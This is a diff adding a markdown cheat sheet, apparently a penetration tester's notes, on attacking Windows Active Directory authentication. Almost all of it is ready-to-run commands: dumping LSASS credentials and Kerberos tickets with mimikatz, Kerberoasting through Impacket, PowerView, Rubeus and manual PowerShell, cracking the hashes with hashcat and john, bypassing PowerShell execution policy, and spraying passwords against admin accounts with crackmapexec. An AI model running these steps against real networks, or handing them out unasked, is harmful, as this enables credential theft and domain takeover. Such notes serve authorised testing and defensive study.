@@ -1,0 +1,63 @@
+# Authentication
+
+### Mimikatz
+
+```
+Cached Creds Storage -> Retrieve stored cache pass.
+
+-> For Single Sign-on access, Pass hashses must be stored somewhere. It's stored in LSASS.
+-> Access to LSASS needs admin level privs. Also they are encrypted with LSASS key.
+-> We use mimikatz to dump LSASS.
+
+1) mimikatz
+# If we are local admin:
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords # Dumping hashes for logged on users using sekurlsa module.
+# Crack the hashes now or Pass the Hash.
+
+sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.
+```
+
+### Kerberoasting
+```
+Service Account Attack -> Kerberoasting attack.
+
+# VERY USEFUL if the domain contains high-priv service account with weak pass.
+# Abusing the service ticket and crack pass of service account in the Domain.
+
+1) Impacket Method (REQUIRES PASS)
+# This will take creds of a user, find kerberoastable users in the domain and then give us it's hash.
+python3 GetUserSPNs.py <Domain>/<username>:<pass> -dc-ip <IP> -request
+hashcat -m 13100 <hashes> /usr/share/wordlists/rockyou.txt --force
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <hashes>
+
+2) Powerview Method (WITHOUT PASS)
+# Import Powerview script
+powershell -ep bypass
+Import-Module .\PowerView.ps1
+Get-NetUser -SPN | select serviceprincipalname # Replace SPN String Entirely below.
+Request-SPNTicket -SPN "MSSQLSvc/xor-app23.xor.com:1433" -Format Hashcat
+
+3) Rebues.exe
+# Transfer Rebues.exe
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoas
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
+
+3) Manual Method (Nidem Article)
+setspn -T medin -Q */* # Find SPN's of Kerbroastable users.
+powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <'HTTP/CorpWebServer.corp.com'> # PUT SPN HERE.
+klist # List all cached Kerberos tickets for current user.
+```
+
+### Password Spraying
+```
+# Try on each user found on each IP in the domain.
+proxychains crackmapexec smb <IP> -u <user> -p <passoword>
+
+# Google how to use this attack
+net accounts # Check Lockout Threshold
+.\Spray-Passwords.ps1 -Pass <password> -Admin # Will Spray password on all Admin accounts.
+```
